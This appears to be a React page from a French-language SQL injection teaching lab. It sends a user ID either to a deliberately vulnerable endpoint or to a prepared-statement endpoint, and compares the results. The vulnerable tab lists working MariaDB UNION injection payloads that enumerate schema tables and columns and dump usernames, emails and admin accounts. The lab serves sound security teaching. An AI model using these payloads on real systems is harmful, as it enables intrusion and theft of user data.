"use client";

import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { AlertCircle, Bug, Shield } from "lucide-react";
import { useState } from "react";

export default function SQLiBaseSurUnion() {
  const [vulnerableInput, setVulnerableInput] = useState("");
  const [secureInput, setSecureInput] = useState("");
  const [vulnerableResult, setVulnerableResult] = useState<any>(null);
  const [secureResult, setSecureResult] = useState<any>(null);
  const [vulnerableLoading, setVulnerableLoading] = useState(false);
  const [secureLoading, setSecureLoading] = useState(false);

  const testVulnerable = async () => {
    setVulnerableLoading(true);
    try {
      const response = await fetch("/api/sqli-vulnerable", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: vulnerableInput }),
      });
      const data = await response.json();
      setVulnerableResult(data);
    } catch (error) {
      setVulnerableResult({ error: "Erreur de connexion" });
    }
    setVulnerableLoading(false);
  };

  const testSecure = async () => {
    setSecureLoading(true);
    try {
      const response = await fetch("/api/sqli-secure", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: secureInput }),
      });
      const data = await response.json();
      setSecureResult(data);
    } catch (error) {
      setSecureResult({ error: "Erreur de connexion" });
    }
    setSecureLoading(false);
  };

  return (
    <div className="container mx-auto p-6 space-y-6">
      <div className="space-y-2">
        <h1 className="text-3xl font-bold">SQLi Basée sur UNION</h1>
        <p className="text-muted-foreground">
          Démonstration d&apos;injection SQL basée sur UNION avec une version
          vulnérable et une version sécurisée
        </p>
      </div>

      <Tabs defaultValue="vulnerable" className="w-full">
        <TabsList className="grid w-full grid-cols-2">
          <TabsTrigger value="vulnerable" className="flex items-center gap-2">
            <Bug className="h-4 w-4" />
            Version Vulnérable
          </TabsTrigger>
          <TabsTrigger value="secure" className="flex items-center gap-2">
            <Shield className="h-4 w-4" />
            Version Sécurisée
          </TabsTrigger>
        </TabsList>

        <TabsContent value="vulnerable" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2 text-red-600">
                <Bug className="h-5 w-5" />
                Version Vulnérable
              </CardTitle>
              <CardDescription>
                Cette version utilise la concaténation directe de chaînes SQL et
                permet l&apos;exploitation via l&apos;opérateur UNION
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm font-medium">ID Utilisateur</label>
                <div className="flex gap-2">
                  <Input
                    
                    value={vulnerableInput}
                    onChange={(e) => setVulnerableInput(e.target.value)}
                    onKeyDown={(e) => e.key === "Enter" && testVulnerable()}
                  />
                  <Button onClick={testVulnerable} disabled={vulnerableLoading}>
                    {vulnerableLoading ? "Test..." : "Tester"}
                  </Button>
                </div>
              </div>

              <Alert variant="destructive">
                <AlertCircle className="h-4 w-4" />
                <AlertTitle>
                  Exemples d&apos;injection basée sur UNION (MariaDB)
                </AlertTitle>
                <AlertDescription className="space-y-1 text-xs mt-2">
                  
                  <div>
                    <code>1 UNION SELECT 1,version(),database(),user()--</code>{" "}
                    - Infos système
                  </div>
                  <div>
                    <code>
                      1 UNION SELECT 1,table_name,table_schema,4 FROM
                      information_schema.tables--
                    </code>{" "}
                    - Lister les tables
                  </div>
                  <div>
                    <code>
                      1 UNION SELECT 1,column_name,data_type,4 FROM
                      information_schema.columns WHERE
                      table_name=&apos;users&apos;--
                    </code>{" "}
                    - Colonnes de users
                  </div>
                  <div>
                    <code>
                      -1 UNION SELECT id,username,email,role FROM users--
                    </code>{" "}
                    - Extraire tous les utilisateurs
                  </div>
                  <div>
                    <code>
                      1 UNION SELECT
                      1,GROUP_CONCAT(username),GROUP_CONCAT(email),GROUP_CONCAT(role)
                      FROM users--
                    </code>{" "}
                    - Tout en une ligne
                  </div>
                  <div>
                    <code>
                      1 UNION SELECT
                      1,CONCAT(username,&apos;:&apos;,email),role,created_at
                      FROM users WHERE role=&apos;admin&apos;--
                    </code>{" "}
                    - Admins uniquement
                  </div>
                </AlertDescription>
              </Alert>

              {vulnerableResult && (
                <div className="space-y-2">
                  <h3 className="font-semibold">Résultat :</h3>
                  <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-xs">
                    {JSON.stringify(vulnerableResult, null, 2)}
                  </pre>
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="secure" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2 text-green-600">
                <Shield className="h-5 w-5" />
                Version Sécurisée
              </CardTitle>
              <CardDescription>
                Cette version utilise des requêtes préparées qui empêchent
                l&apos;injection de clauses UNION
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm font-medium">ID Utilisateur</label>
                <div className="flex gap-2">
                  <Input
                    placeholder="Entrez un ID (ex: 1)"
                    value={secureInput}
                    onChange={(e) => setSecureInput(e.target.value)}
                    onKeyDown={(e) => e.key === "Enter" && testSecure()}
                  />
                  <Button onClick={testSecure} disabled={secureLoading}>
                    {secureLoading ? "Test..." : "Tester"}
                  </Button>
                </div>
              </div>

              <Alert className="border-green-600">
                <Shield className="h-4 w-4 text-green-600" />
                <AlertTitle className="text-green-600">
                  Protection active
                </AlertTitle>
                <AlertDescription className="space-y-1 text-xs mt-2">
                  <div>✓ Validation des entrées</div>
                  <div>✓ Requêtes préparées (Prepared Statements)</div>
                  <div>✓ Paramètres typés et échappés automatiquement</div>
                  <div>✓ Impossibilité d&apos;injecter des clauses UNION</div>
                  <div>✓ Messages d&apos;erreur génériques</div>
                </AlertDescription>
              </Alert>

              {secureResult && (
                <div className="space-y-2">
                  <h3 className="font-semibold">Résultat :</h3>
                  <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-xs">
                    {JSON.stringify(secureResult, null, 2)}
                  </pre>
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
}
